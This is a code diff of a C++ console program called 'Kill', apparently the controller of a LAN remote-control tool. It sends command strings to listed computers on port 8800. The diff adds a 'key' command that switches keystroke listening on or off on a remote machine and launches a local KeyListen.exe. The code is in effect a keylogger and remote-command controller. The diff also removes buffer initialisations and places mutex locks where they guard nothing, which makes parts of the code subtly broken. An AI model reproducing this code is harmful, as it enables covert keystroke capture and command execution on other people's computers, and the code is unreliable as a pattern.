@@ -32,7 +32,7 @@ std::mutex Mutex;
 void init()
 {
     system("chcp 65001");
-    SetConsoleTitle("Kill v2.0 Alpha1.0");
+    SetConsoleTitle("Kill v1.0 Alpha1.0");
     system("cls");
 }
 
@@ -106,7 +106,6 @@ void commandAdd(int last)
 {
     int len = strlen(command);
     char ip[MaxCommand];
-    ip[0] = '\0';
     getCommandWord(ip, last, command);
     if (!checkIP(ip))
     {
@@ -135,10 +134,9 @@ void commandAdd(int last)
 /**
  *@设置自己的IP，为握手做准备
  */
-void commandMyip(int last)
+void commandMe(int last)
 {
     char tmp_ip[MaxIP];
-    tmp_ip[0] = '\0';
     getCommandWord(tmp_ip, last, command);
     if (!checkIP(tmp_ip))
     {
@@ -157,8 +155,6 @@ void commandKill(int last)
 {
     char kill_ip[MaxIP];
     char kill_command[MaxCommand];
-    kill_ip[0] = '\0';
-    kill_command[0] = '\0';
     int next = getCommandWord(kill_ip, last, command);
     if (findChar(command, '\"') != 0)
     {
@@ -194,7 +190,7 @@ void commandKill(int last)
             net::Send(computer_list[kill_to].ip, 8800, tmp_command);
         }
     }
-    // std::lock_guard<std::mutex> lock(Mutex);
+    std::lock_guard<std::mutex> lock(Mutex);
 }
 
 /**
@@ -209,9 +205,39 @@ void commandLs(int last)
     }
 }
 
-void commandKeyListen(int last)
+void commandKey(int last)
 {
-    char mode[MaxCommand];
+    char key_ip[MaxIP];
+    char key_mode[MaxCommand];
+    int next = getCommandWord(key_ip, last, command);
+    getCommandWord(key_mode, next, command);
+    if (findChar(key_ip, '.') == 3)
+    {
+        int kill_to = findComputerIP(key_ip);
+        if (kill_to == -1)
+        {
+            printf("[WARING]: The IP is not in the database\n");
+        }
+        char tmp_command[MaxCommand];
+        sprintf(tmp_command, "k%c", strcmp(key_mode, "true") == 0 ? 't' : 'f');
+        net::Send(key_ip, 8800, tmp_command);
+        system("start KeyListen.exe");
+    }
+    else
+    {
+        int kill_to = findComputerName(key_ip);
+        if (kill_to == -1)
+        {
+            printf("[ERROR]: Computer not found\n");
+        }
+        else
+        {
+            char tmp_command[MaxCommand];
+            sprintf(tmp_command, "k%c", strcmp(key_mode, "true") == 0 ? 't' : 'f');
+            net::Send(computer_list[kill_to].ip, 8800, tmp_command);
+        }
+    }
+    std::lock_guard<std::mutex> lock(Mutex);
 }
 
 /**
@@ -221,15 +247,14 @@ void commandAnalysis()
 {
     int len = strlen(command);
     char main_command[MaxCommand];
-    main_command[0] = '\0';
     int next = getCommandWord(main_command, 0, command);
     if (strcmp(main_command, "add") == 0)
     {
         commandAdd(next);
     }
-    else if (strcmp(main_command, "myip") == 0)
+    else if (strcmp(main_command, "me") == 0)
     {
-        commandMyip(next);
+        commandMe(next);
     }
     else if (strcmp(main_command, "kill") == 0)
     {
@@ -239,8 +264,9 @@ void commandAnalysis()
     {
         commandLs(next);
     }
-    else if (strcmp(main_command, "keylisten") == 0)
+    else if (strcmp(main_command, "key") == 0)
     {
+        commandKey(next);
     }
     else
     {
@@ -255,13 +281,8 @@ int main(int argv, char *argc[])
     for (;;)
     {
         printf("Kill>>> ");
-        command[0] = '\0';
         std::cin.getline(command, MaxCommand);
         commandAnalysis();
     }
     return 0;
 }
-/*
-加锁
-std::lock_guard<std::mutex> lock(Mutex);
-*/
